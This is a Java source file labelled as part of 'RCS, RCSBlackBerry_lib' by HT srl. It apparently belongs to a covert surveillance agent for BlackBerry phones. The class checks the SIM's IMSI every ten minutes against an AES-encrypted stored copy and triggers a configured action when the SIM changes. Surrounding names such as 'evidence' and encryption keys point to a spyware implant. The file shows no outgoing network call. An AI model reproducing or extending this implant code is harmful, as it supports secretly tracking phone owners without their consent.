//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SimChangeEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.IOException;

import blackberry.Device;
import blackberry.config.Keys;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Markup;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class SimChangeEvent.
 */
public final class SimChangeEvent extends Event {

    //#ifdef DEBUG
    private static Debug debug = new Debug("SimChangeEvent", DebugLevel.VERBOSE);
    //#endif

    // ogni dieci minuti
    private static final long PERIOD = 600000;
    Markup markup;

    /**
     * Instantiates a new sim change event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public SimChangeEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_SIM_CHANGE, actionId, confParams, "SimChangeEvent");

        if (!Device.isCDMA()) {

            setPeriod(PERIOD);
            markup = new Markup(eventType, Keys.getInstance().getAesKey());
        }

    }

    protected void actualStart() {
        if (Device.isCDMA()) {
            return;
        }

        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif

        if (!markup.isMarkup()) {
            updateImsi();
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        if (Device.isCDMA()) {
            //#ifdef DEBUG
            debug.warn("no simchange for cdma");
            //#endif
            return;
        }

        final byte[] imsi = Device.getInstance().getWImsi();
        byte[] saved;
        try {
            if (markup.isMarkup()) {
                saved = markup.readMarkup();
                if (!Utils.equals(imsi, saved)) {
                    //#ifdef DEBUG
                    debug.trace("New Imsi, triggering");
                    //#endif
                    updateImsi();
                    trigger();
                }
            } else {
                //#ifdef DEBUG
                debug.trace("markup not present");
                //#endif
                updateImsi();
            }
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("exception, updating imsi. " + e);
            //#endif
            updateImsi();
        }

    }

    protected void actualStop() {

    }

    private void updateImsi() {
        //#ifdef DEBUG
        debug.info("updateImsi: " + Device.getInstance().getImsi());
        //#endif
        markup.createEmptyMarkup();
        markup.writeMarkup(Device.getInstance().getWImsi());
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        return true;
    }

}
